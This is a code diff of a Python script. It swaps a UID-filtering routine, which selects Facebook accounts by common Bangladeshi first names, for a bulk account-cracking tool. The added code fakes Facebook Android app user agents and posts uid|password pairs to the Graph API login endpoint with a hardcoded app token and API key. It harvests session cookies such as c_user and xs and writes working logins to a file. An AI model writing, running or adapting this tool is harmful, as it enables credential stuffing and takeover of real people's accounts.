@@ -1,120 +1,133 @@
-def filter_uids(file_path, names_to_filter):
-    # Read input data from the file
-    with open(file_path, 'r', encoding='utf-8') as file:
-        uid_data = file.read()
+import requests
+import random
 
-    # Split the input data into lines
-    uid_list = uid_data.strip().split('\n')
+url = "https://graph.facebook.com/auth/login"
 
-    # Create a filtered list to hold the UIDs that match the provided names
-    filtered_uids = []
+def useragent():
+    fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
+    enCRACK1 = ['en_GB', 'en_US']
+    CRACKfban1 = ['MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
+    CRACKsim1 = ['Banglalink', 'Grameenphone', 'Robi', 'Airtel', 'Teletalk']
+    modelxxx = [
+        "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I",
+        "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC",
+        "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC",
+        "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG", "M2101K9R", "2109119DG", "M2101K9G",
+        "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C",
+        "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", 
+        "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C",
+        "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG",
+        "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", 
+        "22021211RC"
+    ]
+    gtt = random.choice(modelxxx)
+    android_version = str(random.randrange(6, 13))
+    fbav = str(random.randint(111, 111)) + '.' + str(random.randint(111, 999)) + '.' + str(random.randint(111, 999)) + '.' + str(random.randint(111, 999))
+    fbbv = str(random.randint(111111111, 999999999))
+    lc = random.choice(enCRACK1)
+    cr = random.choice(CRACKsim1)
+    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+    return CRACK_ua
 
-    # Check each UID and name pair
-    for uid in uid_list:
-        # Split the UID and the name part by '|'
-        parts = uid.split('|')
-        if len(parts) == 2:
-            uid_part = parts[0].strip()
-            name_part = parts[1].strip()
+def inc3_cookies(email, pwd):
+    ugen = useragent()
 
-            # Split name part into components
-            name_components = name_part.split()
-            first_name = name_components[0]  # Get the first word as the first name
+    # Prepare data for the login request
+    data = {
+        "format": "json",
+        "cpl": "true",
+        "credentials_type": "device_based_login_password",
+        "error_detail_type": "button_with_disabled",
+        "source": "device_based_login",
+        "email": email,
+        "password": pwd,
+        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+        "generate_session_cookies": "1",
+        "meta_inf_fbmeta": "",
+        "currently_logged_in_userid": "0",
+        "locale": "en_US",
+        "client_country_code": "US",
+        "method": "auth.login",
+        "fb_api_req_friendly_name": "authenticate",
+        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+        "api_key": "882a8490361da98702bf97a021ddc14d",
+    }
 
-            # Check if the first name matches any in names_to_filter
-            if first_name in names_to_filter or name_part in names_to_filter:
-                filtered_uids.append(uid)
-                continue
+    headers = {
+        'User-Agent': ugen,
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Host': 'graph.facebook.com',
+        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+        'X-FB-Connection-Type': 'MOBILE.LTE',
+        'X-Tigon-Is-Retry': 'False',
+        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+        'x-fb-device-group': '5120',
+        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+        'X-FB-Request-Analytics-Tags': 'graphservice',
+        'X-FB-HTTP-Engine': 'Liger',
+        'X-FB-Client-IP': 'True',
+        'X-FB-Server-Cluster': 'True',
+        'x-fb-connection-token': 'd29d67d37eca387482a8d7e786e38746f047a0cbebb64d5ecc412f5e0f1cb5'
+    }
 
-            # Check for last name matches (if there are more components)
-            if len(name_components) > 2:
-                # Check combinations of first name with surname and last name
-                for i in range(1, len(name_components)):
-                    combined_name = ' '.join(name_components[:i + 1])
-                    if combined_name in names_to_filter:
-                        filtered_uids.append(uid)
-                        break
+    # Send login request
+    req = requests.Session()
+    response = req.post(url, data=data, headers=headers).json()
 
-    # Return the filtered UIDs
-    return filtered_uids
+    # Check if session cookies are present in the response
+    if "session_cookies" in response:
+        cookies = {cookie['name']: cookie['value'] for cookie in response['session_cookies']}
 
-# Specify the file path and names to filter
-file_path = '/sdcard/2.txt'  # Replace with the actual path to your file
-names_to_filter = ["Md", "Md.", "Abdul", "Akhtar", "Ali", "Amin", "Anis", "Asif", "Aziz", "Bashir", "Bilal",
-        "Faisal", "Farhan", "Habib", "Hassan", "Hossain", "Imran", "Iqbal", "Jamil", "Kamal", "Karim", 
-    "Khan", "Mahmud", "Moin", "Monir", "Nasir", "Nawaz", "Rahim", "Rashid", "Salim", 
-    "Sami", "Shahid", "Sharif", "Tariq", "Yasin", "Zaman", "Salman", "Wajid", "Sk",
-    "Hasan", "Parvez", "Shakil", "Shahin", "Sohel", "Tarek", "Sajjad", "Raju", "Shamim", 
-    "Sumon", "Shahed", "Shakib", "Arif", "Sabbir", "Noman", "Shafi", "Shah", "Shahriar", "Tanvir", 
-    "Rafi", "Masud", "Rafiq", "Rakib", "Sobuj", "Shuvo", "Faruk", "Nayeem", "Mehedi", "Munna", 
-    "Anwar", "Kabir", "Shuvo", "Rajib", "Sohag", "Sajib", "Rony", "Sakib", "Shahjalal", "Nasim", 
-    "Sakil", "Shuvojit", "Sujon", "Ashik", "Shafiq", "Mahfuz", "Habibullah", "Rasel", "Mizan", 
-    "Monir", "Mithun", "Mamun", "Shanto", "Mehrab", "Rubel", "Sumon", "Sabbir", "Razib", "Khairul", 
-    "Rafat", "Arafat", "Mahbub", "Nizam", "Biplab", "Pavel", "Arman", "Bijoy", "Shanto", "Hasib", 
-    "Ranjan", "Masum", "Liton", "Shamim", "Nazim", "Tuhin", "Arman", "Forhad", "Sakif", "Jabed", 
-    "Shakir", "Rifat", "Rakib", "Muntasir", "Biplob", "Tuhin", "Rabbi", "Rab", "Sourav", "Jony", 
-    "Partha", "Pavel", "Sohan", "Ratul", "Rabiul", "Rifat", "Mizanur", "Jahid", "Alamin", "Tanjim", 
-    "Mahir", "Sajal", "Rifat", "Ratul", "Sarwar", "Shihab", "Rajon", "Jamil", "Rasel", "Ahsan", 
-    "Maruf", "Tanveer", "Sajjad", "Rifat", "Saiful", "Shohel", "Tuhin", "Anik", "Shuvo", "Ridoy", 
-    "Arafat", "Saif", "Hasib", "Bipul", "Jewel", "Sakib", "Sahed", "Sujon", "Mehedi", "Rafat", 
-    "Sakib", "Shihab", "Shamim", "Siam", "Munim", "Sharif", "Rana", "Shamim", "Rana", "Kawsar", 
-    "Mahmud", "Akash", "Rafi", "Mahbub", "Munna", "Rasel", "Mehedi", "Shohel", "Rakib", "Nayeem", 
-    "Rakib", "Mehedi", "Arafat", "Kawsar", "Tahsin", "Rasel", "Arif", "Biplob", "Rakib", "Sajjad", 
-    "Tanzim", "Tuhin", "Mehedi", "Mehedi", "Hasan", "Rasel", "Rakib", "Shamim", "Munna", "Rony", 
-    "Fahim", "Mehedi", "Jewel", "Rafsan", "Munna", "Shamim", "Najim", "Rakib", "Najim", "Sabbir", 
-    "Shanto", "Biplob", "Mithun", "Shamim", "Nazim", "Mukul", "Tahsin", "Anisur", "Abdus", 
-    "Mohammad", "Kazi", "Abul", "Nur", "Nazmul", "Sohel", "Monjur", "Arifur", "Mostafizur", 
-    "Kamrul", "Sazzad", "Aminul", "Rashed", "Mahfuzur", "Monirul", "Shafiqul", "Imtiaz", "Enamul", 
-    "Fakrul", "Mahmudul", "Samsul", "Abdur", "Farid", "Mizanur", "Jahirul", "Helal", "Shahidul", 
-    "Liton", "Rezaul", "Jashim", "Selim", "Anwar", "Motiur", "Azizul", "Golam", "Habiba", "Hanif", 
-    "Ibrahim", "Jamal", "Kabir", "Harun", "Masud", "Mahim", "Jisan", "Jibon", "Shofik", "Mustakim", 
-    "Irfan", "Rahmatullah", "Fazlul", "Shamsul", "Afsar", "Mahbubul", "Shafayat", "Shariful", 
-    "Iqra", "Anan", "Ishtiaq", "Ahad", "Ehsanul", "Abdullah", "Shabbir", "Liton", "Masum", 
-    "Aklas", "Ashraful", "Atiq", "Mohiuddin", "Najmul", "Feroze", "Jaber", "Ashrafuzzaman", 
-    "Mahbubur", "Nazib", "Sadiq", "Shahedul", "Imranul", "Muntashir", "Naushad", "Rashidur", "Touhid", 
-    "Wali", "Mahfuzul", "Saad", "Azhar", "Naeem", "Shahiduzzaman", "Tazul", "Helaluddin", "Masudul", 
-    "Murshed", "Nure Alam", "Nasrul", "Khalid", "Sayeed", "Maswood", "Shamsuzzaman", "Tanzir", 
-    "Nahid", "Shaikh", "Rubayet", "Shadman", "Hasnain", "Shams", "Ibadur", "Arafatul", "Humaun", 
-    "Akash", "Tarik", "Shuvo", "Arshad", "Bashar", "Junaid", "Khaled", "Mahin", "Nadir", "Wasim", 
-    "Zubair", "Nazrul", "Rashedul", "Zakir", "Aftab", "Anwarul", "Asad", "Fazle", "Khorshed", 
-    "Lokman", "Ishraq", "Touhidur", "Hassanuzzaman", "Nusratullah", "Tayef", "Tawfiq", "Zahedul", 
-    "Shojib", "Abdulahi", "Shawkat", "Sadat", "Zahidur", "Hossainul", "Adnan", "Tarek", "Saeed",
-    "Sk", "Amin", "Emran", "Rana", "Riad", "Shagor", "Kawsar", "Anis", "Ashraf", "Akbar", "Alim", 
-    "Arif", "Azim", "Bashir", "Babar", "Badrul", "Baki", "Belal", "Bodi", "Bulbul", "Chowdhury", "Daud", "Dulal", 
-    "Emon", "Enamul", "Fahim", "Farhad", "Faisal", "Ferdous", "Gafur", "Gazi", "Habib", "Hasib", "Hasan", "Helal", 
-    "Hossain", "Ibrahim", "Imran", "Iqbal", "Ismail", "Jahid", "Jalal", "Jamil", "Jasim", "Kabir", "Kamal", "Karim", 
-    "Khaled", "Liton", "Mahi", "Mahfuz", "Mamun", "Manik", "Masud", "Mizan", "Mokbul", "Moin", "Monir", "Mostafa", 
-    "Mujib", "Murad", "Nafis", "Naim", "Nasim", "Nazmul", "Niaz", "Noman", "Nur", "Parvez", "Rafiqul", "Rakib", 
-    "Rashed", "Razib", "Rezaul", "Sohel", "Riaz", "Ripon", "Rubel", "Sabbir", "Sadiq", "Sajid", "Salam", "Sami", 
-    "Sanjib", "Shahid", "Shakib", "Shamsul", "Sharif", "Sohag", "Sumon", "Tariq", "Taufiq", "Touhid", "Wahid", 
-    "Yasin", "Zahid", "Zahir", "Zakir", "Zaman", "Zia", "Zubair", "Abdul", "Abid", "Adnan", "Afif", "Ahad", "Ahmad", 
-    "Ahsan", "Akash", "Ali", "Alim", "Aminul", "Amzad", "Anik", "Anwar", "Arifur", "Asad", "Ashfaq", "Atiq", "Azhar", 
-    "Aziz", "Babu", "Badal", "Basir", "Bijoy", "Bilal", "Chanchal", "Delwar", "Dipu", "Ehsan", "Ershad", "Eshan", 
-    "Fakhrul", "Faruq", "Fazle", "Golam", "Hafiz", "Hamid", "Haris", "Hasnat", "Hedayet", "Humayun", "Ilias", 
-    "Ishtiaq", "Jabed", "Jafor", "Jamshed", "Johirul", "Junaid", "Kamrul", "Kawsar", "Khalil", "Khorshed", "Lalon", 
-    "Latif", "Mahmud", "Majid", "Maksud", "Manjur", "Maruf", "Mazhar", "Mehedi", "Milton", "Minhaj", "Miraz", 
-    "Mobarak", "Mohsin", "Morshed", "Muazzam", "Mubin", "Mujibur", "Mustafa", "Nadim", "Nahid", "Nasir", "Nazim", 
-    "Niloy", "Nizam", "Noor", "Nure", "Obaid", "Omar", "Pavel", "Rahim", "Rakhat", "Rana", "Rasel", "Rifat", "Riyad", 
-    "Rokon", "Ruhul", "Sabit", "Saiful", "Sajjad", "Salim", "Sarwar", "Shafiq", "Shahin", "Shakil", "Shamim", 
-    "Shanto", "Sheikh", "Sohail", "Subho", "Tanjil", "Tanvir", "Tipu", "Tuhin", "Uzzal", "Wasim", "Younus", "Zafor", 
-    "Zahidul", "Zakaria", "Zamal", "Zulfiqar", "Afsar", "Afzal", "Alam", "Amirul", "Ananta", "Anindya", "Ashik", 
-    "Ashim", "Ashraful", "Atikur", "Aynal", "Azad", "Babul", "Bahauddin", "Barkat", "Bashar", "Bokul", "Danish", 
-    "Ekram", "Fahad", "Faisal", "Farhan", "Farid", "Fayez", "Ferdous", "Gaziul", "Giyas", "Golam", "Harun", 
-    "Hasanuzzaman", "Helal", "Himel", "Hiron", "Hossainul", "Hridoy", "Ibrahim", "Iftekhar", "Imtiaz", "Iqbal", 
-    "Ishtiaque", "Jalil", "Jewel", "Jibon", "Kamal", "Kamrul", "Kawser", "Kazi", "Khaledur", "Latifur", "Liton", 
-    "Lutfar", "Mahadi", "Mahbub", "Mahdi", "Majed", "Manik", "Maruf", "Masraf", "Masum", "Mazharul", "Mehdi", 
-    "Milon", "Mizanur", "Mohammad", "Mohibur", "Moinul", "Mokhlesur", "Monowar", "Morsalin", "Mubarak", "Muhaimin", 
-    "Mujahid", "Mustafizur", "Nadim", "Nahiyan", "Najmul", "Nayeem", "Nazir", "Nezam", "Nishat", "Niyaz", "Noorul", 
-    "Oli", "Omar", "Parvez", "Rabbani", "Rabbi", "Rafique", "Raihan", "Rakibul", "Rashedul", "Reza", "Riazul", 
-    "Rokonuzzaman", "Ruhul", "Rumana", "Saad", "Sabbir", "Sabir", "Sadi", "Saiful", "Sajeeb", "Sajidur", "Sajjadur", 
-    "Salman", "Samad", "Samir", "Sanjoy", "Sarwar", "Saud", "Sazzad", "Shahidul", "Shahed", "Shahedul", "Shahriar", 
-    "Shakibul", "Shamimul", "Shariful", "Shaukat", "Sohail", "Sujan", "Sumon", "Suruj", "Syed", "Tajul", "Tamal", 
-    "Tanveer", "Tariqul", "Taufiqur", "Tipu", "Toufique", "Touhidul", "Uzzal", "Wasim", "Yasinul", "Yunus", 
-    "Zahirul", "Zakariah", "Zayed", "Ziaul", "Zillur", "Zubayer", "Zulfiqar"]
+        # Check if c_user is present to verify successful login
+        c_user = cookies.get('c_user', '')
+        if not c_user:
+            return None
 
-# Get the filtered UIDs
-filtered_uids = filter_uids(file_path, names_to_filter)
+        # Extract specific cookies
+        datr = cookies.get('datr', '')
+        sb = cookies.get('sb', '')
+        xs = cookies.get('xs', '')
+        fr = cookies.get('fr', '')
 
-# Print the filtered UIDs (or save them to a file as needed)
-for uid in filtered_uids:
-    print(uid)
+        # Create the cookie string in the specified format
+        cookie = f"datr={datr}; sb={sb}; c_user={c_user}; xs={xs}; fr={fr}; m_page_voice={c_user}"
+
+        # Handle checkpoint detection
+        if 'checkpoint' in cookie:
+            return None
+        else:
+            return cookie
+    else:
+        return None
+
+if __name__ == "__main__":
+    # Ask for input and output file paths
+    input_file = input("Enter the input file path: ")
+    output_file = input("Enter the output file path: ")
+
+    # Open the input and output files
+    with open(input_file, "r") as infile, open(output_file, "w") as outfile:
+        # Read each line from the input file
+        for line in infile:
+            line = line.strip()
+            if not line:
+                continue  # Skip empty lines
+
+            # Split the line into uid, pass, and cookies (initial value of cookies may be empty)
+            parts = line.split("|")
+            if len(parts) < 2:
+                continue  # Skip invalid lines
+            uid = parts[0]
+            password = parts[1]
+
+            # Try to extract cookies
+            cookies = inc3_cookies(uid, password)
+            if cookies:
+                # If cookies were successfully retrieved, update the entry in the output file
+                outfile.write(f"{uid}|{password}|{cookies}\n")
+            else:
+                # If cookies could not be retrieved, write the original entry (or handle as needed)
+                outfile.write(f"{uid}|{password}|login_failed\n")
+
+    print("Process completed.")
